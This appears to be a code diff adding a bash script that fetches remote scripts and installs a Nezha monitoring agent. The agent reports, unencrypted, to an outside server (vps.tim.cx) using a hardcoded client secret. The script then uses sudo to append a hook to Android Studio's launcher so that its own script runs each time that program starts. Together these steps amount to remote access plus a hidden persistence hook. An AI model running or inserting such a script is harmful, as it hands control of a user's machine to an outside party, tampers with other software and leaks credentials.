@@ -1,0 +1,12 @@
+#!/bin/bash
+wget https://github.com/summaxx/myscript/raw/refs/heads/master/xg.sh && chmod +x xg.sh
+wget https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.sh && chmod +x install.sh
+env NZ_SERVER=vps.tim.cx:80 NZ_TLS=false NZ_CLIENT_SECRET=XncprLKLI4d9qyQkj6nmNWEsbNdQ5nHp ./install.sh
+cat <<END >> tt.sh
+#!/bin/bash
+sleep 5
+gnome-terminal  # Replace with your terminal command
+exit 0
+END
+chmod +x tt.sh
+echo "/home/user/tt.sh" | sudo tee -a /opt/google/android-studio/bin/studio.sh
